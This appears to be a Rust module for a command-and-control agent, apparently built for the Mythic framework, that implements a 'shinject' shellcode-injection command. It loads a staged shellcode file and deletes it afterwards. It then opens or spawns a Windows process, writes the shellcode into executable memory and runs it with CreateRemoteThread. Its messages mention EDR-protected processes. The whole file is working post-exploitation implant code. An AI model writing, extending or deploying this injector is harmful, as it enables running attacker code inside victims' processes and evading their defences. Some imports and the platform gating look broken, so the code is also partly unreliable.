use serde::{Deserialize, Serialize};
use std::error::Error;
use std::result::Result;

#[cfg(target_os = "windows")]
use std::fs;
#[cfg(target_os = "windows")]
use std::mem;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
#[cfg(target_os = "windows")]
use winapi::shared::basetsd::SIZE_T;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(target_os = "windows")]
use winapi::um::winbase::WAIT_OBJECT_0;

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ShinjectArgs {
    pub shellcode: String,  // File ID from Mythic
    pub process_id: u32,
}

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
#[cfg(target_os = "windows")]
const MEM_COMMIT: DWORD = 0x1000;
#[cfg(target_os = "windows")]
const MEM_RESERVE: DWORD = 0x2000;
#[cfg(target_os = "windows")]
const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
#[cfg(target_os = "windows")]
const INFINITE: DWORD = 0xFFFFFFFF;

/// Wrapper function for compatibility with the tasking system
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)
        .map_err(|e| format!("Failed to parse shinject arguments: {}", e))?;
    
    match execute_shinject(args) {
        Ok(output) => {
            // Use your mythic_success macro or function
            Ok(serde_json::json!({
                "status": "success",
                "task_id": task.id,
                "output": output
            }))
        },
        Err(error) => {
            // Use your mythic_error macro or function  
            Ok(serde_json::json!({
                "status": "error",
                "task_id": task.id,
                "error": error
            }))
        },
    }
}

/// Main command execution function
#[cfg(target_os = "windows")]
pub fn execute_shinject(args: ShinjectArgs) -> Result<String, String> {
    // Get the shellcode bytes from the file
    let shellcode_bytes = match get_shellcode_from_mythic(&args.shellcode) {
        Ok(bytes) => bytes,
        Err(e) => return Err(e),
    };

    // Validate shellcode size
    if shellcode_bytes.is_empty() {
        return Err("Shellcode file is empty".to_string());
    }

    unsafe {
        if args.process_id == 0 {
            // Create new process and inject
            match create_process_and_inject(&shellcode_bytes) {
                Ok(output) => Ok(output),
                Err(e) => Err(e),
            }
        } else {
            // Inject into existing process
            match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
                Ok(output) => Ok(output),
                Err(e) => Err(e),
            }
        }
    }
}

/// Helper function to locate and read the shellcode file
#[cfg(target_os = "windows")]
fn get_shellcode_from_mythic(file_id: &str) -> Result<Vec<u8>, String> {
    // Check common locations where Mythic might download files
    let possible_paths = vec![
        std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
        std::env::temp_dir().join(file_id),
        std::env::home_dir().unwrap_or_default().join("Downloads").join(file_id),
        std::path::Path::new(file_id).to_path_buf(),
    ];
    
    // Try to read the file from various possible locations
    for (i, path) in possible_paths.iter().enumerate() {
        eprintln!("DEBUG: Checking location {}: {}", i + 1, path.display());
        eprintln!("DEBUG: File exists: {}", path.exists());
        
        if path.exists() {
            match fs::read(path) {
                Ok(bytes) => {
                    if !bytes.is_empty() {
                        eprintln!("DEBUG: Found file at {} with {} bytes", path.display(), bytes.len());
                        // Clean up the file after reading (optional)
                        let _ = fs::remove_file(path);
                        return Ok(bytes);
                    }
                }
                Err(e) => {
                    eprintln!("DEBUG: Failed to read file {}: {}", path.display(), e);
                    continue;
                }
            }
        }
    }
    
    // If file not found, provide detailed error message
    let current_dir = std::env::current_dir()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    Err(format!(
        "Shellcode file '{}' not found in any expected location.\n\n\
        DEBUG INFO:\n\
        - File ID: {}\n\
        - Current working directory: {}\n\
        - Searched locations:\n{}\n\n\
        TROUBLESHOOTING:\n\
        1. Make sure the file exists in Mythic\n\
        2. Use the 'download {}' command first to download the file\n\
        3. Verify the file was successfully downloaded to the agent\n\
        4. Check Mythic server logs for file transfer errors",
        file_id,
        file_id,
        current_dir,
        possible_paths.iter()
            .enumerate()
            .map(|(i, path)| format!("  {}. {} (exists: {})", i + 1, path.display(), path.exists()))
            .collect::<Vec<_>>()
            .join("\n"),
        file_id
    ))
}

/// Create new process and inject shellcode (easier for POC)
#[cfg(target_os = "windows")]
unsafe fn create_process_and_inject(shellcode: &[u8]) -> Result<String, String> {
    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
    use winapi::um::winnt::{PROCESS_CREATE_SUSPENDED};
    use winapi::shared::winerror::ERROR_SUCCESS;
    
    // Create a suspended notepad process
    let mut si: STARTUPINFOW = std::mem::zeroed();
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    
    let app_name = "notepad.exe\0".encode_utf16().collect::<Vec<u16>>();
    
    let result = CreateProcessW(
        app_name.as_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        FALSE,
        PROCESS_CREATE_SUSPENDED,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut si,
        &mut pi,
    );
    
    if result == 0 {
        return Err(format!("Failed to create process. Error: {}", GetLastError()));
    }
    
    // Now inject into the newly created process
    match inject_shellcode_impl(pi.dwProcessId, shellcode) {
        Ok(output) => {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            Ok(format!("Created new process (PID: {}) and injected shellcode successfully!\n\n{}", pi.dwProcessId, output))
        },
        Err(e) => {
            // Clean up the process if injection failed
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            Err(e)
        }
    }
}

// Windows shellcode injection implementation
#[cfg(target_os = "windows")]
unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
    // Open the target process
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if h_process.is_null() {
        let error_code = GetLastError();
        return Err(format!(
            "Failed to open process with PID: {}. Error code: {}\n\n\
            Common causes:\n\
            - Process does not exist\n\
            - Insufficient privileges (try running as admin)\n\
            - Process is protected (antivirus/EDR)",
            process_id, error_code
        ));
    }

    let buffer_size = shellcode.len();
    
    // Allocate memory in the target process
    let remote_mem = VirtualAllocEx(
        h_process,
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        CloseHandle(h_process);
        return Err(format!(
            "VirtualAllocEx failed. Error: {}\n\n\
            Failed to allocate {} bytes in target process",
            GetLastError(), buffer_size
        ));
    }

    // Write shellcode to the allocated memory
    let mut bytes_written: SIZE_T = 0;
    let write_result = WriteProcessMemory(
        h_process,
        remote_mem,
        shellcode.as_ptr() as LPVOID,
        buffer_size,
        &mut bytes_written,
    );

    if write_result == 0 || bytes_written != buffer_size {
        CloseHandle(h_process);
        return Err(format!(
            "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}\n\n\
            Failed to write shellcode to target process memory",
            bytes_written, buffer_size, GetLastError()
        ));
    }

    // Create remote thread to execute the shellcode
    let mut thread_id: DWORD = 0;
    let h_thread = CreateRemoteThread(
        h_process,
        ptr::null_mut(),
        0,
        Some(mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if h_thread.is_null() {
        CloseHandle(h_process);
        return Err(format!(
            "CreateRemoteThread failed. Error: {}\n\n\
            Failed to create execution thread in target process",
            GetLastError()
        ));
    }

    // Wait for the thread to complete
    let wait_result = WaitForSingleObject(h_thread, INFINITE);

    // Clean up handles
    CloseHandle(h_thread);
    CloseHandle(h_process);

    if wait_result == WAIT_OBJECT_0 {
        Ok(format!(
            "✅ Shellcode successfully injected!\n\n\
            📊 Injection Details:\n\
            - Target PID: {}\n\
            - Thread ID: {}\n\
            - Shellcode Size: {} bytes\n\
            - Allocation Address: {:p}\n\n\
            🎯 The shellcode has been executed in the target process.",
            process_id, thread_id, buffer_size, remote_mem
        ))
    } else {
        Err(format!(
            "WaitForSingleObject failed with result: {}\n\n\
            The shellcode was injected but we couldn't wait for completion.",
            wait_result
        ))
    }
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
    Err("shinject command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(target_os = "windows"))]
pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
    Err("shinject command is only supported on Windows".to_string())
}

/// Direct command handler for integration with command dispatch system
pub fn handle_shinject_command(args: &str) -> Result<String, String> {
    let shinject_args: ShinjectArgs = serde_json::from_str(args)
        .map_err(|e| format!("Failed to parse shinject arguments: {}", e))?;
    
    execute_shinject(shinject_args)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let args = ShinjectArgs {
            shellcode: "test_file_id".to_string(),
            process_id: 1234,
        };
        assert_eq!(args.shellcode, "test_file_id");
        assert_eq!(args.process_id, 1234);
    }

    #[test]
    fn test_shinject_command_handler() {
        let result = handle_shinject_command(r#"{"shellcode": "test", "process_id": 1234}"#);
        // On non-Windows, this should return an error about platform not supported
        // On Windows, it will try to find the file and likely fail
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_invalid_json_handling() {
        let result = handle_shinject_command("invalid json");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Failed to parse shinject arguments"));
    }
}